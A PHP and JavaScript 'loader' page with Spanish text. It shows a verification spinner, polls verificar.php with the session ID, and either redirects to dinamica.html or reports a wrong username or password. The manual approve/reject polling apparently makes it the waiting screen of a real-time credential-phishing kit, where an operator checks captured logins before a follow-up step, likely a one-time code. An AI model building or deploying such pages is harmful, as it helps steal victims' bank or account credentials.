<?php
// loader.php
// Lee la cookie sessionId y la inyecta en el JS
$id = $_COOKIE['sessionId'] ?? '';
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando</title>
  <style>
    /* Tus estilos actuales de loader… */
    * { margin:0;padding:0;box-sizing:border-box; }
    html,body{width:100%;height:100%;display:flex;
      align-items:center;justify-content:center;
      background:#2b2a28;font-family:'Segoe UI',sans-serif;
      color:#fff;}
    .loader{max-width:300px;width:100%;text-align:center;}
    .logo{width:180px;margin-bottom:30px;
      animation:fadeIn 1.5s ease-in-out infinite alternate;}
    .spinner{width:50px;height:50px;
      border:4px solid rgba(255,255,255,0.2);
      border-top:4px solid #FFD700;border-radius:50%;
      animation:spin 1s linear infinite;margin:0 auto 20px auto;}
    .loading-text{font-size:16px;font-weight:300;opacity:0.9;}
    @keyframes spin{to{transform:rotate(360deg);}}
    @keyframes fadeIn{from{opacity:0.7;}to{opacity:1;}}
  </style>
</head>
<body>
  <div class="loader">
    <img class="logo" src="logo.svg" alt="Logo">
    <div class="spinner"></div>
    <div class="loading-text">Verificando, por favor espera…</div>
  </div>

  <script>
    // 1) Tener el ID que PHP inyectó
    const id = '<?= htmlspecialchars($id, ENT_QUOTES) ?>';
    if (!id) {
      alert('No hay sesión activa. Vuelve a iniciar sesión.');
      window.location.href = 'index.html';
    }

    // 2) Polling cada 5s
    async function checkStatus() {
      try {
        const res  = await fetch(`verificar.php?id=${encodeURIComponent(id)}`);
        const data = await res.json();
        if (data.status === 'aprobado') {
          window.location.href = 'dinamica.html';
        } else if (data.status === 'rechazado') {
          alert('Usuario o contraseña incorrectos. Intenta de nuevo.');
          document.cookie = 'sessionId=; Max-Age=0; path=/';
          window.location.href = 'index.html';
        }
      } catch (err) {
        console.error('Error al verificar estado:', err);
      }
    }

    checkStatus();
    setInterval(checkStatus, 5000);
  </script>
</body>
</html>